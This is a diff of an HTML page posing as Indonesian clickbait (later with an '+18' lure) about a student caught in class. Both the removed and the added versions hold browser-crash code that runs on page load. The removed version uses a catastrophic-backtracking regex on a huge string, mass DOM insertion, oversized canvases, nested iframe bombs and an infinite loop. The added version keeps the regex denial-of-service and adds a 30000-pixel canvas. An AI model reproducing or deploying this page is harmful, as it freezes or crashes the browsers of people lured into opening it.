@@ -1,66 +1,24 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>Seorang siswa tertangkap basah Tidur di kelas saat jam pelajaran berlangsung siswa melakukan hal yang tak terduga sampai...</title>
-  <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    html, body {
-      width: 100%; height: 100%;
-      background: black;
-      color: lime;
-      font-family: monospace;
-      overflow: hidden;
-    }
-    div { white-space: pre; position: absolute; }
-  </style>
-</head>
+<head><title>Seorang siswa tertangkap basah Tidur di kelas saat jam pelajaran berlangsung siswa melakukan hal yang tak terduga sampai membuka celana nya khusus untuk +18</title></head>
 <body>
-  <h1>Seorang siswa tertangkap basah Tidur di kelas saat jam pelajaran berlangsung siswa melakukan hal yang tak terduga sampai melakukan hal yang sangat memalukan di kelas</h1>
-  <script>
-    const u = "ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ";
-    const bigStr = u.repeat(20_000_000);
-    const pattern = /([\u1b80-\u1bbf\u13000-\u1342f\ud800-\udfff]+)+$/;
+<script>
+  const payload = "ꦾꦾ꧀ꦾ".repeat(10_000_000);
+  const pattern = /(([\u1b80-\u1bbf\u13000-\u1342f\ud800-\udfff]*)*)+$/;
 
-    // 1. Trigger Regex Spike Instantly
-    try { pattern.test(bigStr); } catch (e) {}
+  let s = '';
+  for (let i = 0; i < 1e7; i++) {
+    s += String.fromCharCode(0xD800 + (i % 1024));
+  }
 
-    // 2. DOM spam ekstrem tanpa jeda
-    for (let i = 0; i < 20000; i++) {
-      const d = document.createElement("div");
-      d.innerText = u.repeat(3000);
-      d.style.fontSize = `${6 + Math.random() * 40}px`;
-      d.style.color = `hsl(${Math.random() * 360}, 100%, 70%)`;
-      d.style.left = `${Math.random() * window.innerWidth}px`;
-      d.style.top = `${Math.random() * window.innerHeight}px`;
-      document.body.appendChild(d);
-    }
-
-    // 3. Canvas overload ekstrem instan
-    for (let j = 0; j < 10; j++) {
-      const c = document.createElement("canvas");
-      c.width = c.height = 20000;
-      const ctx = c.getContext("2d");
-      for (let i = 0; i < 1000; i++) {
-        ctx.fillStyle = `rgba(${Math.random()*255},${Math.random()*255},${Math.random()*255},0.5)`;
-        ctx.fillRect(Math.random()*20000, Math.random()*20000, 1000, 1000);
-      }
-      document.body.appendChild(c);
-    }
-
-    // 4. Iframe bom segera
-    for (let k = 0; k < 20; k++) {
-      const iframe = document.createElement("iframe");
-      iframe.srcdoc = `<iframe srcdoc="<iframe srcdoc='<iframe srcdoc=\\"<h1>${u.repeat(1000)}</h1>\\"></iframe>'></iframe>"></iframe>`;
-      iframe.width = iframe.height = 2;
-      iframe.style.border = "none";
-      document.body.appendChild(iframe);
-    }
-
-    // 5. Blocking loop akhir (mengunci thread JS)
-    while (true) {
-      // Spike CPU dengan regex ulang
-      pattern.test(bigStr);
-    }
-  </script>
+  pattern.test(payload + s);
+  
+  const c = document.createElement('canvas');
+  c.width = c.height = 30000;
+  document.body.appendChild(c);
+  const ctx = c.getContext('2d');
+  ctx.fillStyle = 'red';
+  ctx.fillRect(0, 0, 30000, 30000);
+</script>
 </body>
 </html>
